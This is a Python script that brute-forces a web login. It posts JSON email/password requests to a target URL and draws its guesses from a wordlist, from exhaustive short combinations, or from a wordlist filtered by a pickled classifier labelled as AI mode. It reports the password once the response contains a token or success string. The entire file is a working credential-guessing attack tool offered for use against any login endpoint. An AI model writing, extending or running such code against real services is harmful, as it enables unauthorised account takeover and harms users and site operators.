import argparse
import requests
import itertools
import string
import pickle

def load_ai_model(model_path='ai/password_model.pkl', vectorizer_path='ai/vectorizer.pkl'):
    with open(model_path, 'rb') as m, open(vectorizer_path, 'rb') as v:
        return pickle.load(m), pickle.load(v)

def predict_passwords(passwords, model, vectorizer):
    X = vectorizer.transform(passwords)
    preds = model.predict(X)
    return [pwd for pwd, pred in zip(passwords, preds) if pred == 1]

def brute_force_generator(max_length=4):
    chars = string.ascii_lowercase + string.digits
    for l in range(1, max_length + 1):
        for combo in itertools.product(chars, repeat=l):
            yield ''.join(combo)

def send_login_request(url, username, password):
    data = {"email": username, "password": password}
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, json=data, headers=headers)
    return "token" in response.text or "success" in response.text

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True, help='Target login URL')
    parser.add_argument('--username', required=True, help='Target username/email')
    parser.add_argument('--mode', choices=['brute', 'dictionary', 'ai'], required=True)
    parser.add_argument('--wordlist', help='Wordlist file for dictionary/AI')
    parser.add_argument('--max-length', type=int, default=4, help='Max length for brute-force')
    args = parser.parse_args()

    passwords = []

    if args.mode == 'dictionary':
        if not args.wordlist:
            print("[!] Wordlist required for dictionary mode.")
            return
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]

    elif args.mode == 'ai':
        if not args.wordlist:
            print("[!] Wordlist required for AI mode.")
            return
        model, vectorizer = load_ai_model()
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            raw_passwords = [line.strip() for line in f]
        passwords = predict_passwords(raw_passwords, model, vectorizer)

    elif args.mode == 'brute':
        passwords = brute_force_generator(args.max_length)

    print(f"[🔍] Starting {args.mode} attack on {args.url} with user {args.username}")
    for pwd in passwords:
        if send_login_request(args.url, args.username, pwd):
            print(f"[✅] Password found: {pwd}")
            return
    print("[❌] Password not found.")

if __name__ == "__main__":
    main()
